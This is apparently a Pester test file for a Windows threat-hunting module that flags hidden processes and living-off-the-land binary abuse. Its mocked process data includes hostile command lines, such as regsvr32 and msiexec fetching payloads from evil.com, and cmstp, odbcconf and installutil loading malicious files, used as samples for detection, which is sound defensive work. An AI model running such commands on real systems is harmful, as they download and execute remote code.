<#
.SYNOPSIS
    Pester 5 Tests for Process & Injection Hunting
#>

# Load the source files into the test session
BeforeAll {
    $SrcPath = Join-Path $PSScriptRoot "..\..\playbooks\windows\threat_hunting\dev\src"
    . (Join-Path $SrcPath "00_Parameters_And_Globals.ps1")
    . (Join-Path $SrcPath "01_Process_And_Injection.ps1")
}

Describe "Invoke-ProcessHunt Module" {

    BeforeEach {
        # Reset the global findings array before every single test
        $script:Findings = @()
        # Suppress console output during tests to keep the output clean
        $Quiet = $true
    }

    It "Should detect a Hidden Process (Rootkit behavior: API mismatch)" {

        # MOCK: Standard API only sees 'explorer'. The re-verification probe
        # (Get-Process -Id 666) must THROW - the hidden PID stays invisible to the API.
        Mock Get-Process {
            if ($Id) { throw "Cannot find a process with the process identifier $Id." }
            return @( [PSCustomObject]@{ Id = 100; ProcessName = "explorer" } )
        }

        # MOCK: WMI sees 'explorer' AND a hidden 'evil.exe'. The re-verification probe
        # (Get-CimInstance -Filter "ProcessId=666") must confirm evil.exe is STILL alive.
        Mock Get-CimInstance {
            if ($Filter -and $Filter -match '666') {
                return @( [PSCustomObject]@{ ProcessId = 666; Name = "evil.exe"; ParentProcessId = 100; CommandLine = "evil.exe -hide" } )
            }
            return @(
                [PSCustomObject]@{ ProcessId = 100; Name = "explorer.exe"; ParentProcessId = 4; CommandLine = "explorer.exe" },
                [PSCustomObject]@{ ProcessId = 666; Name = "evil.exe"; ParentProcessId = 100; CommandLine = "evil.exe -hide" }
            )
        }

        # Action
        Invoke-ProcessHunt

        # Assert
        $script:Findings.Count | Should -BeGreaterThan 0
        $Alert = $script:Findings | Where-Object { $_.Type -eq "Hidden Process" }

        $Alert | Should -Not -BeNullOrEmpty
        $Alert.Target | Should -Match "PID: 666"
        $Alert.Severity | Should -Be "High"
    }

    It "Should detect LOLBin execution (encoded PowerShell + NoProfile, score >= 3)" {

        Mock Get-Process {
            return @( [PSCustomObject]@{ Id = 200; ProcessName = "powershell" } )
        }

        # -enc (score 2) + -nop (score 1) = 3, threshold met
        Mock Get-CimInstance {
            return @(
                [PSCustomObject]@{ ProcessId = 100; Name = "explorer.exe";   ParentProcessId = 4;   CommandLine = "explorer.exe" },
                [PSCustomObject]@{ ProcessId = 200; Name = "powershell.exe"; ParentProcessId = 100; CommandLine = "powershell.exe -nop -enc ZWNobyAnbWFsd2FyZSc=" }
            )
        }

        Invoke-ProcessHunt

        $Alert = $script:Findings | Where-Object { $_.Type -eq "LOLBin Execution" }
        $Alert | Should -Not -BeNullOrEmpty
        $Alert.Target | Should -Match "PID: 200"
        $Alert.Details | Should -Match "-EncodedCommand"
    }

    It "Should raise Critical when LOLBin is spawned by a high-risk parent (Office/browser)" {

        Mock Get-Process {
            return @( [PSCustomObject]@{ Id = 300; ProcessName = "powershell" } )
        }

        # -enc (score 2) + parent=winword.exe (score*2) = Critical
        Mock Get-CimInstance {
            return @(
                [PSCustomObject]@{ ProcessId = 400; Name = "winword.exe";    ParentProcessId = 4;   CommandLine = "winword.exe /dde" },
                [PSCustomObject]@{ ProcessId = 300; Name = "powershell.exe"; ParentProcessId = 400; CommandLine = "powershell.exe -enc ZWNobyBoYWNrZWQ=" }
            )
        }

        Invoke-ProcessHunt

        $Alert = $script:Findings | Where-Object { $_.Type -eq "LOLBin Execution" }
        $Alert | Should -Not -BeNullOrEmpty
        $Alert.Severity | Should -Be "Critical"
        $Alert.Details | Should -Match "winword.exe"
    }

    It "Should NOT flag -WindowStyle Hidden alone (score 1, below threshold)" {

        Mock Get-Process {
            return @( [PSCustomObject]@{ Id = 500; ProcessName = "powershell" } )
        }

        Mock Get-CimInstance {
            return @(
                [PSCustomObject]@{ ProcessId = 4;   Name = "System";         ParentProcessId = 0;  CommandLine = "" },
                [PSCustomObject]@{ ProcessId = 500; Name = "powershell.exe"; ParentProcessId = 4;  CommandLine = "powershell.exe -WindowStyle Hidden -File backup.ps1" }
            )
        }

        Invoke-ProcessHunt
        $Alert = $script:Findings | Where-Object { $_.Type -eq "LOLBin Execution" }
        $Alert | Should -BeNullOrEmpty
    }

    It "Should ignore healthy, baseline OS processes" {

        Mock Get-Process {
            return @( [PSCustomObject]@{ Id = 600; ProcessName = "svchost" } )
        }

        Mock Get-CimInstance {
            return @(
                [PSCustomObject]@{ ProcessId = 600; Name = "svchost.exe"; ParentProcessId = 100; CommandLine = "svchost.exe -k netsvcs" }
            )
        }

        Invoke-ProcessHunt
        $script:Findings.Count | Should -Be 0
    }

    It "Should NOT flag WidgetService.exe as hidden (Windows Store app isolation — PPL)" {
        # WidgetService.exe uses IUM and does not appear in standard API — allowlisted
        Mock Get-Process {
            return @( [PSCustomObject]@{ Id = 100; ProcessName = "explorer" } )
        }
        Mock Get-CimInstance {
            return @(
                [PSCustomObject]@{ ProcessId = 100;   Name = "explorer.exe";    ParentProcessId = 4;   CommandLine = "explorer.exe" },
                [PSCustomObject]@{ ProcessId = 14744; Name = "WidgetService.exe"; ParentProcessId = 100; CommandLine = "WidgetService.exe" }
            )
        }
        Invoke-ProcessHunt
        $hidden = $script:Findings | Where-Object { $_.Type -eq 'Hidden Process' -and $_.Target -match '14744' }
        $hidden | Should -BeNullOrEmpty -Because 'WidgetService.exe is a legitimate Store-app PPL process'
    }

    It "Should NOT flag dllhost.exe as hidden (COM surrogate uses PPL-like isolation)" {
        Mock Get-Process {
            return @( [PSCustomObject]@{ Id = 100; ProcessName = "explorer" } )
        }
        Mock Get-CimInstance {
            return @(
                [PSCustomObject]@{ ProcessId = 100;  Name = "explorer.exe"; ParentProcessId = 4;   CommandLine = "explorer.exe" },
                [PSCustomObject]@{ ProcessId = 5678; Name = "dllhost.exe";  ParentProcessId = 100; CommandLine = "dllhost.exe /Processid:{12345}" }
            )
        }
        Invoke-ProcessHunt
        $hidden = $script:Findings | Where-Object { $_.Type -eq 'Hidden Process' -and $_.Target -match '5678' }
        $hidden | Should -BeNullOrEmpty -Because 'dllhost.exe (COM surrogate) is in the hidden-process allowlist'
    }
}

Describe "GAP-P01 LOLBin Pattern Expansion" {

    BeforeEach {
        $script:Findings = @()
        $script:Quiet    = $true
    }

    It "Should flag wmic process call create combined with hidden window as High" {
        Mock Get-Process { @([PSCustomObject]@{ Id = 700; ProcessName = 'cmd' }) }
        Mock Get-CimInstance {
            @([PSCustomObject]@{
                ProcessId = 700; Name = 'cmd.exe'; ParentProcessId = 4
                CommandLine = 'wmic.exe process call create "cmd /c evil.bat" -WindowStyle Hidden'
            })
        }
        Invoke-ProcessHunt
        $f = $script:Findings | Where-Object { $_.Type -eq 'LOLBin Execution' -and $_.Details -match 'wmic-process-create' }
        $f | Should -Not -BeNullOrEmpty
        $f[0].Severity | Should -BeIn @('High','Critical')
    }

    It "Should flag regsvr32 Squiblydoo combined with IEX as High or Critical" {
        Mock Get-Process { @([PSCustomObject]@{ Id = 701; ProcessName = 'regsvr32' }) }
        Mock Get-CimInstance {
            @([PSCustomObject]@{
                ProcessId = 701; Name = 'regsvr32.exe'; ParentProcessId = 4
                CommandLine = 'regsvr32.exe /i:http://evil.com/s.sct /s scrobj.dll IEX(something)'
            })
        }
        Invoke-ProcessHunt
        $f = $script:Findings | Where-Object { $_.Type -eq 'LOLBin Execution' -and $_.Details -match 'regsvr32-Squiblydoo' }
        $f | Should -Not -BeNullOrEmpty
        $f[0].Severity | Should -BeIn @('High','Critical')
    }

    It "Should flag msiexec with remote URL combined with hidden window" {
        Mock Get-Process { @([PSCustomObject]@{ Id = 702; ProcessName = 'msiexec' }) }
        Mock Get-CimInstance {
            @([PSCustomObject]@{
                ProcessId = 702; Name = 'msiexec.exe'; ParentProcessId = 4
                CommandLine = 'msiexec.exe /i http://evil.com/payload.msi /quiet -WindowStyle Hidden'
            })
        }
        Invoke-ProcessHunt
        $f = $script:Findings | Where-Object { $_.Type -eq 'LOLBin Execution' -and $_.Details -match 'msiexec-remoteURL' }
        $f | Should -Not -BeNullOrEmpty
    }

    It "Should flag installutil as a LOLBin pattern combined with encoded command" {
        Mock Get-Process { @([PSCustomObject]@{ Id = 703; ProcessName = 'installutil' }) }
        Mock Get-CimInstance {
            @([PSCustomObject]@{
                ProcessId = 703; Name = 'InstallUtil.exe'; ParentProcessId = 4
                CommandLine = 'InstallUtil.exe -enc ZWNobyAnbWFsd2FyZSc= C:\Temp\payload.dll'
            })
        }
        Invoke-ProcessHunt
        $f = $script:Findings | Where-Object { $_.Type -eq 'LOLBin Execution' -and $_.Details -match 'installutil' }
        $f | Should -Not -BeNullOrEmpty
    }

    It "Should flag cmstp as a LOLBin pattern combined with hidden window" {
        Mock Get-Process { @([PSCustomObject]@{ Id = 704; ProcessName = 'cmstp' }) }
        Mock Get-CimInstance {
            @([PSCustomObject]@{
                ProcessId = 704; Name = 'cmstp.exe'; ParentProcessId = 4
                CommandLine = 'cmstp.exe /ns /s C:\Temp\evil.inf -WindowStyle Hidden'
            })
        }
        Invoke-ProcessHunt
        $f = $script:Findings | Where-Object { $_.Type -eq 'LOLBin Execution' -and $_.Details -match 'cmstp' }
        $f | Should -Not -BeNullOrEmpty
    }

    It "Should flag odbcconf as a LOLBin pattern combined with encoded command" {
        Mock Get-Process { @([PSCustomObject]@{ Id = 705; ProcessName = 'odbcconf' }) }
        Mock Get-CimInstance {
            @([PSCustomObject]@{
                ProcessId = 705; Name = 'odbcconf.exe'; ParentProcessId = 4
                CommandLine = 'odbcconf.exe -enc ZWNobyAnbWFsd2FyZSc= /A {REGSVR C:\Temp\evil.dll}'
            })
        }
        Invoke-ProcessHunt
        $f = $script:Findings | Where-Object { $_.Type -eq 'LOLBin Execution' -and $_.Details -match 'odbcconf' }
        $f | Should -Not -BeNullOrEmpty
    }
}

# SIG # Begin signature block
# MIIcDgYJKoZIhvcNAQcCoIIb/zCCG/sCAQExDzANBglghkgBZQMEAgEFADB5Bgor
# BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG
# KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCCCuJ3raeBK2maB
# T/WVIVVeNKhy0emQTAKDktLQAR/rI6CCFlIwggMUMIIB/KADAgECAhAfQMjwyAWn
# lEKgkjdOOOytMA0GCSqGSIb3DQEBCwUAMCIxIDAeBgNVBAMMF0lSIFRvb2xraXQg
# Q29kZSBTaWduaW5nMB4XDTI2MDYyNjAyMjc0OFoXDTI5MDYyNjAyMzc0OFowIjEg
# MB4GA1UEAwwXSVIgVG9vbGtpdCBDb2RlIFNpZ25pbmcwggEiMA0GCSqGSIb3DQEB
# AQUAA4IBDwAwggEKAoIBAQCVM7HdfviXfsMldvVuCmIVeX2nhTRWSA3FnoNQ7zd2
# lsAZuL+EkM+xZ6OiH6L5B6gZsCree2lTU0n0aNdSbNxKgzfaxFL49pteZwFI3ooS
# E+sqbAHRlG7UYrB90qWqPy6L2nh0ntu7R3IPzCbhTl6wgdT3e4axY+Bt4zZqcGY4
# XNolYl32o1h6/Xn1RDbK2RTsIblxuVYfYLdCotMldxNkE3oXBItZUoiGYNyCbnS0
# pBeBzKuJ7110b3jMhW5euch+jNqPlo7xwpAy57ut6LB/F/apn5BMhVXL0BsSIISW
# bvDg8KnX0ryWSVzEhCRDULbHFHceT8KT0j22yIYBIe19AgMBAAGjRjBEMA4GA1Ud
# DwEB/wQEAwIHgDATBgNVHSUEDDAKBggrBgEFBQcDAzAdBgNVHQ4EFgQUY4Zdh7We
# EeqWTl4U+JyMI+/Bv44wDQYJKoZIhvcNAQELBQADggEBAGADp8Vqkz5dS0PaRLED
# IuTzMDd6t33jfUATEmnXvHWcir5zyCZhwz+iyGI8atBuTvD9t4skDJNEf+niZneM
# Ql2/lr6nz/cGlWdZjgOAdIsj4I3MSrAwXN7fK5QjyXcCUQpzTfBifVshB7vl3006
# QYE2GwXHWt5/rJKNRHKXBdtuw9XL1iUtmgQOwHhLJ4F//Lf59Fon5KGP7Hmt8tJv
# HrfolpKc7pF7XKyO3grw2sOz7BnmVYBRGTAhVJ+E/+IFAPUsThQFila4LAsvqCPv
# 265GLrtTUiXjZOcQ0LT5ohZWcvU4fpQ3b473zxrl0IpfARI5XSlTC/T6arQoRyXU
# 4QwwggWNMIIEdaADAgECAhAOmxiO+dAt5+/bUOIIQBhaMA0GCSqGSIb3DQEBDAUA
# MGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsT
# EHd3dy5kaWdpY2VydC5jb20xJDAiBgNVBAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQg
# Um9vdCBDQTAeFw0yMjA4MDEwMDAwMDBaFw0zMTExMDkyMzU5NTlaMGIxCzAJBgNV
# BAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdp
# Y2VydC5jb20xITAfBgNVBAMTGERpZ2lDZXJ0IFRydXN0ZWQgUm9vdCBHNDCCAiIw
# DQYJKoZIhvcNAQEBBQADggIPADCCAgoCggIBAL/mkHNo3rvkXUo8MCIwaTPswqcl
# LskhPfKK2FnC4SmnPVirdprNrnsbhA3EMB/zG6Q4FutWxpdtHauyefLKEdLkX9YF
# PFIPUh/GnhWlfr6fqVcWWVVyr2iTcMKyunWZanMylNEQRBAu34LzB4TmdDttceIt
# DBvuINXJIB1jKS3O7F5OyJP4IWGbNOsFxl7sWxq868nPzaw0QF+xembud8hIqGZX
# V59UWI4MK7dPpzDZVu7Ke13jrclPXuU15zHL2pNe3I6PgNq2kZhAkHnDeMe2scS1
# ahg4AxCN2NQ3pC4FfYj1gj4QkXCrVYJBMtfbBHMqbpEBfCFM1LyuGwN1XXhm2Tox
# RJozQL8I11pJpMLmqaBn3aQnvKFPObURWBf3JFxGj2T3wWmIdph2PVldQnaHiZdp
# ekjw4KISG2aadMreSx7nDmOu5tTvkpI6nj3cAORFJYm2mkQZK37AlLTSYW3rM9nF
# 30sEAMx9HJXDj/chsrIRt7t/8tWMcCxBYKqxYxhElRp2Yn72gLD76GSmM9GJB+G9
# t+ZDpBi4pncB4Q+UDCEdslQpJYls5Q5SUUd0viastkF13nqsX40/ybzTQRESW+UQ
# UOsxxcpyFiIJ33xMdT9j7CFfxCBRa2+xq4aLT8LWRV+dIPyhHsXAj6KxfgommfXk
# aS+YHS312amyHeUbAgMBAAGjggE6MIIBNjAPBgNVHRMBAf8EBTADAQH/MB0GA1Ud
# DgQWBBTs1+OC0nFdZEzfLmc/57qYrhwPTzAfBgNVHSMEGDAWgBRF66Kv9JLLgjEt
# UYunpyGd823IDzAOBgNVHQ8BAf8EBAMCAYYweQYIKwYBBQUHAQEEbTBrMCQGCCsG
# AQUFBzABhhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wQwYIKwYBBQUHMAKGN2h0
# dHA6Ly9jYWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRFJvb3RD
# QS5jcnQwRQYDVR0fBD4wPDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29t
# L0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDARBgNVHSAECjAIMAYGBFUdIAAw
# DQYJKoZIhvcNAQEMBQADggEBAHCgv0NcVec4X6CjdBs9thbX979XB72arKGHLOyF
# XqkauyL4hxppVCLtpIh3bb0aFPQTSnovLbc47/T/gLn4offyct4kvFIDyE7QKt76
# LVbP+fT3rDB6mouyXtTP0UNEm0Mh65ZyoUi0mcudT6cGAxN3J0TU53/oWajwvy8L
# punyNDzs9wPHh6jSTEAZNUZqaVSwuKFWjuyk1T3osdz9HNj0d1pcVIxv76FQPfx2
# CWiEn2/K2yCNNWAcAgPLILCsWKAOQGPFmCLBsln1VWvPJ6tsds5vIy30fnFqI2si
# /xK4VC0nftg62fC2h5b9W9FcrBjDTZ9ztwGpn1eqXijiuZQwgga0MIIEnKADAgEC
# AhANx6xXBf8hmS5AQyIMOkmGMA0GCSqGSIb3DQEBCwUAMGIxCzAJBgNVBAYTAlVT
# MRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5j
# b20xITAfBgNVBAMTGERpZ2lDZXJ0IFRydXN0ZWQgUm9vdCBHNDAeFw0yNTA1MDcw
# MDAwMDBaFw0zODAxMTQyMzU5NTlaMGkxCzAJBgNVBAYTAlVTMRcwFQYDVQQKEw5E
# aWdpQ2VydCwgSW5jLjFBMD8GA1UEAxM4RGlnaUNlcnQgVHJ1c3RlZCBHNCBUaW1l
# U3RhbXBpbmcgUlNBNDA5NiBTSEEyNTYgMjAyNSBDQTEwggIiMA0GCSqGSIb3DQEB
# AQUAA4ICDwAwggIKAoICAQC0eDHTCphBcr48RsAcrHXbo0ZodLRRF51NrY0NlLWZ
# loMsVO1DahGPNRcybEKq+RuwOnPhof6pvF4uGjwjqNjfEvUi6wuim5bap+0lgloM
# 2zX4kftn5B1IpYzTqpyFQ/4Bt0mAxAHeHYNnQxqXmRinvuNgxVBdJkf77S2uPoCj
# 7GH8BLuxBG5AvftBdsOECS1UkxBvMgEdgkFiDNYiOTx4OtiFcMSkqTtF2hfQz3zQ
# Sku2Ws3IfDReb6e3mmdglTcaarps0wjUjsZvkgFkriK9tUKJm/s80FiocSk1VYLZ
# lDwFt+cVFBURJg6zMUjZa/zbCclF83bRVFLeGkuAhHiGPMvSGmhgaTzVyhYn4p0+
# 8y9oHRaQT/aofEnS5xLrfxnGpTXiUOeSLsJygoLPp66bkDX1ZlAeSpQl92QOMeRx
# ykvq6gbylsXQskBBBnGy3tW/AMOMCZIVNSaz7BX8VtYGqLt9MmeOreGPRdtBx3yG
# OP+rx3rKWDEJlIqLXvJWnY0v5ydPpOjL6s36czwzsucuoKs7Yk/ehb//Wx+5kMqI
# MRvUBDx6z1ev+7psNOdgJMoiwOrUG2ZdSoQbU2rMkpLiQ6bGRinZbI4OLu9BMIFm
# 1UUl9VnePs6BaaeEWvjJSjNm2qA+sdFUeEY0qVjPKOWug/G6X5uAiynM7Bu2ayBj
# UwIDAQABo4IBXTCCAVkwEgYDVR0TAQH/BAgwBgEB/wIBADAdBgNVHQ4EFgQU729T
# SunkBnx6yuKQVvYv1Ensy04wHwYDVR0jBBgwFoAU7NfjgtJxXWRM3y5nP+e6mK4c
# D08wDgYDVR0PAQH/BAQDAgGGMBMGA1UdJQQMMAoGCCsGAQUFBwMIMHcGCCsGAQUF
# BwEBBGswaTAkBggrBgEFBQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEEG
# CCsGAQUFBzAChjVodHRwOi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRU
# cnVzdGVkUm9vdEc0LmNydDBDBgNVHR8EPDA6MDigNqA0hjJodHRwOi8vY3JsMy5k
# aWdpY2VydC5jb20vRGlnaUNlcnRUcnVzdGVkUm9vdEc0LmNybDAgBgNVHSAEGTAX
# MAgGBmeBDAEEAjALBglghkgBhv1sBwEwDQYJKoZIhvcNAQELBQADggIBABfO+xaA
# HP4HPRF2cTC9vgvItTSmf83Qh8WIGjB/T8ObXAZz8OjuhUxjaaFdleMM0lBryPTQ
# M2qEJPe36zwbSI/mS83afsl3YTj+IQhQE7jU/kXjjytJgnn0hvrV6hqWGd3rLAUt
# 6vJy9lMDPjTLxLgXf9r5nWMQwr8Myb9rEVKChHyfpzee5kH0F8HABBgr0UdqirZ7
# bowe9Vj2AIMD8liyrukZ2iA/wdG2th9y1IsA0QF8dTXqvcnTmpfeQh35k5zOCPmS
# Nq1UH410ANVko43+Cdmu4y81hjajV/gxdEkMx1NKU4uHQcKfZxAvBAKqMVuqte69
# M9J6A47OvgRaPs+2ykgcGV00TYr2Lr3ty9qIijanrUR3anzEwlvzZiiyfTPjLbnF
# RsjsYg39OlV8cipDoq7+qNNjqFzeGxcytL5TTLL4ZaoBdqbhOhZ3ZRDUphPvSRmM
# Thi0vw9vODRzW6AxnJll38F0cuJG7uEBYTptMSbhdhGQDpOXgpIUsWTjd6xpR6oa
# Qf/DJbg3s6KCLPAlZ66RzIg9sC+NJpud/v4+7RWsWCiKi9EOLLHfMR2ZyJ/+xhCx
# 9yHbxtl5TPau1j/1MIDpMPx0LckTetiSuEtQvLsNz3Qbp7wGWqbIiOWCnb5WqxL3
# /BAPvIXKUjPSxyZsq8WhbaM2tszWkPZPubdcMIIG7TCCBNWgAwIBAgIQCoDvGEuN
# 8QWC0cR2p5V0aDANBgkqhkiG9w0BAQsFADBpMQswCQYDVQQGEwJVUzEXMBUGA1UE
# ChMORGlnaUNlcnQsIEluYy4xQTA/BgNVBAMTOERpZ2lDZXJ0IFRydXN0ZWQgRzQg
# VGltZVN0YW1waW5nIFJTQTQwOTYgU0hBMjU2IDIwMjUgQ0ExMB4XDTI1MDYwNDAw
# MDAwMFoXDTM2MDkwMzIzNTk1OVowYzELMAkGA1UEBhMCVVMxFzAVBgNVBAoTDkRp
# Z2lDZXJ0LCBJbmMuMTswOQYDVQQDEzJEaWdpQ2VydCBTSEEyNTYgUlNBNDA5NiBU
# aW1lc3RhbXAgUmVzcG9uZGVyIDIwMjUgMTCCAiIwDQYJKoZIhvcNAQEBBQADggIP
# ADCCAgoCggIBANBGrC0Sxp7Q6q5gVrMrV7pvUf+GcAoB38o3zBlCMGMyqJnfFNZx
# +wvA69HFTBdwbHwBSOeLpvPnZ8ZN+vo8dE2/pPvOx/Vj8TchTySA2R4QKpVD7dvN
# Zh6wW2R6kSu9RJt/4QhguSssp3qome7MrxVyfQO9sMx6ZAWjFDYOzDi8SOhPUWlL
# nh00Cll8pjrUcCV3K3E0zz09ldQ//nBZZREr4h/GI6Dxb2UoyrN0ijtUDVHRXdmn
# cOOMA3CoB/iUSROUINDT98oksouTMYFOnHoRh6+86Ltc5zjPKHW5KqCvpSduSwhw
# UmotuQhcg9tw2YD3w6ySSSu+3qU8DD+nigNJFmt6LAHvH3KSuNLoZLc1Hf2JNMVL
# 4Q1OpbybpMe46YceNA0LfNsnqcnpJeItK/DhKbPxTTuGoX7wJNdoRORVbPR1VVnD
# uSeHVZlc4seAO+6d2sC26/PQPdP51ho1zBp+xUIZkpSFA8vWdoUoHLWnqWU3dCCy
# FG1roSrgHjSHlq8xymLnjCbSLZ49kPmk8iyyizNDIXj//cOgrY7rlRyTlaCCfw7a
# SUROwnu7zER6EaJ+AliL7ojTdS5PWPsWeupWs7NpChUk555K096V1hE0yZIXe+gi
# AwW00aHzrDchIc2bQhpp0IoKRR7YufAkprxMiXAJQ1XCmnCfgPf8+3mnAgMBAAGj
# ggGVMIIBkTAMBgNVHRMBAf8EAjAAMB0GA1UdDgQWBBTkO/zyMe39/dfzkXFjGVBD
# z2GM6DAfBgNVHSMEGDAWgBTvb1NK6eQGfHrK4pBW9i/USezLTjAOBgNVHQ8BAf8E
# BAMCB4AwFgYDVR0lAQH/BAwwCgYIKwYBBQUHAwgwgZUGCCsGAQUFBwEBBIGIMIGF
# MCQGCCsGAQUFBzABhhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wXQYIKwYBBQUH
# MAKGUWh0dHA6Ly9jYWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFRydXN0ZWRH
# NFRpbWVTdGFtcGluZ1JTQTQwOTZTSEEyNTYyMDI1Q0ExLmNydDBfBgNVHR8EWDBW
# MFSgUqBQhk5odHRwOi8vY3JsMy5kaWdpY2VydC5jb20vRGlnaUNlcnRUcnVzdGVk
# RzRUaW1lU3RhbXBpbmdSU0E0MDk2U0hBMjU2MjAyNUNBMS5jcmwwIAYDVR0gBBkw
# FzAIBgZngQwBBAIwCwYJYIZIAYb9bAcBMA0GCSqGSIb3DQEBCwUAA4ICAQBlKq3x
# HCcEua5gQezRCESeY0ByIfjk9iJP2zWLpQq1b4URGnwWBdEZD9gBq9fNaNmFj6Eh
# 8/YmRDfxT7C0k8FUFqNh+tshgb4O6Lgjg8K8elC4+oWCqnU/ML9lFfim8/9yJmZS
# e2F8AQ/UdKFOtj7YMTmqPO9mzskgiC3QYIUP2S3HQvHG1FDu+WUqW4daIqToXFE/
# JQ/EABgfZXLWU0ziTN6R3ygQBHMUBaB5bdrPbF6MRYs03h4obEMnxYOX8VBRKe1u
# NnzQVTeLni2nHkX/QqvXnNb+YkDFkxUGtMTaiLR9wjxUxu2hECZpqyU1d0IbX6Wq
# 8/gVutDojBIFeRlqAcuEVT0cKsb+zJNEsuEB7O7/cuvTQasnM9AWcIQfVjnzrvwi
# CZ85EE8LUkqRhoS3Y50OHgaY7T/lwd6UArb+BOVAkg2oOvol/DJgddJ35XTxfUlQ
# +8Hggt8l2Yv7roancJIFcbojBcxlRcGG0LIhp6GvReQGgMgYxQbV1S3CrWqZzBt1
# R9xJgKf47CdxVRd/ndUlQ05oxYy2zRWVFjF7mcr4C34Mj3ocCVccAvlKV9jEnstr
# niLvUxxVZE/rptb7IRE2lskKPIJgbaP5t2nGj/ULLi49xTcBZU8atufk+EMF/cWu
# iC7POGT75qaL6vdCvHlshtjdNXOCIUjsarfNZzGCBRIwggUOAgEBMDYwIjEgMB4G
# A1UEAwwXSVIgVG9vbGtpdCBDb2RlIFNpZ25pbmcCEB9AyPDIBaeUQqCSN0447K0w
# DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq
# hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC
# NwIBFTAvBgkqhkiG9w0BCQQxIgQgsdzC5C/l7ef9nfnf+64mMp19hd4XO3t82Yss
# d1EY7aIwDQYJKoZIhvcNAQEBBQAEggEAgaC+QP/6ZKZRV0GgQKHTA/SOwRVgrk78
# /Pk7FUqZe5/cEiky45hoZXK3yCDhIQ07F11nRLGbCuQPBHPBUpf9SdqJXWgHFyLD
# jZ9JJ5+ZZQYWabgVbRysZeFJ1IJLTENvE7xr5HuNdYUYth4EejCoYdAD8boN4n92
# F6x1+GuQu6cMvF7Z1w7FULn/xJKi3fTWdZE4YTZYtmNUc/Hd1KbdAHQlbRMz7E8e
# eMLVhiZU0wb5yGBxPwCyV8//ricpCsVtnj+1jxggbkRfkXWDutM10H0vuu8eAAWi
# 166CeLPt2KfkIhEuOMXwV5G1llUl0aR0eqZIGI0RrlOZa2xlDH2uXqGCAyYwggMi
# BgkqhkiG9w0BCQYxggMTMIIDDwIBATB9MGkxCzAJBgNVBAYTAlVTMRcwFQYDVQQK
# Ew5EaWdpQ2VydCwgSW5jLjFBMD8GA1UEAxM4RGlnaUNlcnQgVHJ1c3RlZCBHNCBU
# aW1lU3RhbXBpbmcgUlNBNDA5NiBTSEEyNTYgMjAyNSBDQTECEAqA7xhLjfEFgtHE
# dqeVdGgwDQYJYIZIAWUDBAIBBQCgaTAYBgkqhkiG9w0BCQMxCwYJKoZIhvcNAQcB
# MBwGCSqGSIb3DQEJBTEPFw0yNjA2MjYyMzI3NDNaMC8GCSqGSIb3DQEJBDEiBCC7
# bWjtC77wtgcaSxo6tPkzQRXtLmzlUf//f4rlDRwCEzANBgkqhkiG9w0BAQEFAASC
# AgCBd7EF5wqL5iXGP7fchfCMn21BTo25G3DjST/s/TR20np0h3/8C1ThMnxFOz6g
# IvkA3gPiK8+dfdRYshh85+tTZWElLRZ783Z5+dIrUJg2qL+WADzX3Mso9Xt+h8yr
# DyyQMUh+2r4qlD4+OeB2CmFnFhFsHZGzX0PVX6lEe0f6eHC0JCKPE7DgGCSMzKVB
# 8RV7bvM6FLT5Hy/K9d0dFCit3acz4WZ0kQBdBBi3rJskjsMYDqdq6kffGQLHBP+D
# MD7wiUQ1oeCCFql4nHhBVjnpU3+C74bHy5axAJG87mYBc/LuxniyhUFWwnNVNJgC
# lZcwy0kr8C5fVCeLmTEydzJYWGiDrusdz50DcuyuapijjJEZYdeJY0NZ4M3rvCAX
# iI/22YLOH83ShTTeZbX+8Fyqj7gdLvKQJ6xRaXbOeoBZdhEGihWn16RlPyZx/6wJ
# RKz68dViiEhowCPaQZo9iiaQLssgk3jEogWYqayhs8PNIwqKcSib1E5w0CVozg5i
# c2ZCfrt869DC5KDWAZCmTMVnmzcMt6uLcKjMkXONuq2BrxXrVU+Lhvncyy6HIW8L
# 5Nvagw52zhNWnyM7rLTJc88eGQ2VkSa6j/hgzRyH1DLxfNIrIGGSnXwkwbayppu/
# 1bS4JD5lOPiRBBk5uoAsJ1zf3vcp8WW/wrLzOMHXhekhIA==
# SIG # End signature block
